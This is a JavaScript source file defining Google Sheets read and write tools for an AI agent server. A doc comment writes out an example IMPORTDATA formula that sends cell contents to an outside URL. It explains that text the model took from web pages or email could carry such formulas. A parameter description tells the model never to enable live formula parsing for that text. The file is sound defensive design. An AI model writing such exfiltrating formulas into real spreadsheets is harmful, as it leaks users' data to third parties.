import { sheets as sheetsApi } from '@googleapis/sheets';
import { z } from 'zod';
import { apiOptions, json, text } from './shared.js';

const api = (auth) => sheetsApi({ version: 'v4', ...apiOptions(auth) });

export async function readRange(auth, { spreadsheetId, range }) {
  const res = await api(auth).spreadsheets.values.get({ spreadsheetId, range });
  return res.data.values ?? [];
}

/**
 * Write a block of values.
 *
 * `RAW` is the default on purpose. Under `USER_ENTERED`, Sheets parses each
 * string as though it were typed into the cell, so `=IMPORTDATA("https://…"&A1)`
 * becomes a live formula that can send the sheet's contents to any URL. The
 * values written here are model output, often derived from web pages or email
 * the model has read, so formula evaluation is opt-in rather than ambient.
 */
export async function writeRange(auth, { spreadsheetId, range, values, valueInputOption = 'RAW' }) {
  const res = await api(auth).spreadsheets.values.update({
    spreadsheetId,
    range,
    valueInputOption,
    requestBody: { values },
  });
  return res.data;
}

export function registerSheetsTools(server, getClient) {
  const SPREADSHEET_ID = z
    .string()
    .describe('Spreadsheet id — the long string between "/d/" and "/edit" in the sheet URL. Not the sheet name.');

  server.registerTool(
    'sheets_read_range',
    {
      title: 'Read Sheets range',
      annotations: { readOnlyHint: true, openWorldHint: true },
      description: 'Reads cell values from a range in a Google Sheet (e.g. range "Sheet1!A1:C10").',
      inputSchema: {
        spreadsheetId: SPREADSHEET_ID,
        range: z
          .string()
          .describe('A1 notation range, e.g. "Sheet1!A1:C10", or a bare sheet name like "Sheet1" for all data. Quote sheet names containing spaces: "\'My Sheet\'!A1:B2".'),
      },
    },
    async ({ spreadsheetId, range }) => json(await readRange(await getClient(), { spreadsheetId, range }))
  );

  server.registerTool(
    'sheets_write_range',
    {
      title: 'Write Sheets range',
      annotations: { readOnlyHint: false, destructiveHint: true, idempotentHint: true, openWorldHint: true },
      description:
        'Writes cell values into a range in a Google Sheet immediately, overwriting existing content in that range. No confirmation step.',
      inputSchema: {
        spreadsheetId: SPREADSHEET_ID,
        range: z
          .string()
          .describe('A1 notation range to write into, e.g. "Sheet1!A1". The written block extends right and down from the start cell, overwriting whatever is there.'),
        values: z
          .array(z.array(z.union([z.string(), z.number(), z.boolean()])))
          .describe('Rows of cell values, outer array = rows, inner = columns. e.g. [["Name","Score"],["Ada",91]].'),
        valueInputOption: z
          .enum(['RAW', 'USER_ENTERED'])
          .optional()
          .describe('"USER_ENTERED" parses values as if typed, so "=…" becomes a live formula: never use it for text from web pages or messages. Defaults to "RAW".'),
      },
    },
    async (args) => {
      const result = await writeRange(await getClient(), args);
      return text(`Updated ${result.updatedCells} cells in ${result.updatedRange}`);
    }
  );
}
